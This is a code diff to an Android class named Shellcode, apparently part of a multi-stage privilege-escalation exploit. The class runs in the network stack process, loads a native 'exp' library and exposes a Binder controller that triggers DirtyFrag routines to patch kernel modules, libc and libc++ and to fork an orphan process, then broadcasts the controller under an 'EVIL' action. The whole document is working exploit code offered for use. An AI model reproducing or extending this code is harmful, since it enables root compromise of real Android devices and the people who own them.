@@ -7,14 +7,19 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ActivityInfo;
 import android.content.pm.ApplicationInfo;
+import android.os.Binder;
+import android.os.Bundle;
+import android.os.IBinder;
+import android.os.Parcel;
 import android.os.Process;
+import android.os.RemoteException;
 import android.os.ServiceManager;
 import android.util.Log;
 
 import java.lang.reflect.Method;
 
 public class Shellcode extends BroadcastReceiver {
-    private static final String TAG = "LSPromise";
+    public static final String TAG = "LSPromise";
     private static final int NETWORK_STACK_UID = 1073;
     public static void onAppComponentFactoryLoaded() {
         int uid = Process.myUid();
@@ -64,13 +69,55 @@ public class Shellcode extends BroadcastReceiver {
     /**
      * To be executed in network stack process, to launch kernel exploit
      */
-    private static void stage2() {
+    private static void stage2(Context context) {
         Log.e(TAG, "in network stack, stage 2");
-        // TODO add kernel exploit
+        System.loadLibrary("exp");
+        var controller = new Binder() {
+            @Override
+            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
+                switch (code) {
+                    case 1 -> {
+                        Log.d(TAG, "executing patchMod");
+                        reply.writeInt(DirtyFrag.patchMod());
+                        return true;
+                    }
+                    case 2 -> {
+                        Log.d(TAG, "executing patchLibc");
+                        reply.writeInt(DirtyFrag.patchLibc());
+                        return true;
+                    }
+                    case 3 -> {
+                        Log.d(TAG, "executing patchCxx");
+                        reply.writeInt(DirtyFrag.patchCxx());
+                        return true;
+                    }
+                    case 4 -> {
+                        Log.d(TAG, "executing forkProcess");
+                        reply.writeInt(DirtyFrag.createOrphanProcess());
+                        return true;
+                    }
+                }
+                return super.onTransact(code, data, reply, flags);
+            }
+        };
+
+        var intent = new Intent();
+        intent.setPackage(BuildConfig.APPLICATION_ID);
+        intent.setAction("EVIL");
+        var extras = new Bundle();
+        extras.putBinder("CONTROLLER", controller);
+        intent.putExtras(extras);
+
+        context.sendBroadcast(intent);
+        Log.d(TAG, "controller sent");
     }
 
     @Override public void onReceive(Context context, Intent intent) {
         // In network stack
-        stage2();
+        try {
+            stage2(context);
+        } catch (Throwable t) {
+            Log.e(TAG, "handle receive", t);
+        }
     }
 }
